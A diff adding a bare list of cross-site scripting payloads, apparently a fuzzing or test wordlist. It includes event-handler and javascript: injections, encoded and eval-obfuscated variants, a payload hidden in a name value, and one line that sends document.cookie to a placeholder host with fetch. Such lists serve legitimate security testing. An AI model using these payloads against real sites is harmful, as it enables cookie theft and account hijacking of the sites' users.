@@ -1,0 +1,21 @@
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=console.log(document.cookie)>
+<img/src=x/onerror=alert(document.cookie)>
+<svg onload=alert(document.cookie)>
+<svg/onload=alert(document.cookie)>
+<details open ontoggle=alert(document.cookie)>
+<input autofocus onfocus=alert(document.cookie)>
+<select autofocus onfocus=alert(document.cookie)>
+<video src=x onerror=alert(document.cookie)>
+<audio src=x onerror=alert(document.cookie)>
+<marquee onstart=alert(document.cookie)>
+<body onload=alert(document.cookie)>
+<iframe srcdoc="<script>alert(parent.document.cookie)</script>">
+<a href=javascript:alert(document.cookie)>x</a>
+<b onmouseover=alert(document.cookie)>hover</b>
+<img%20src=x%20onerror=alert(document.cookie)>
+%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E
+<img src=x onerror=alert`${document.cookie}`>
+<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
+<img src=x onerror=fetch('https://example.invalid/?c='+document.cookie)>
+Dave<img src=x onerror=alert(document.cookie)>
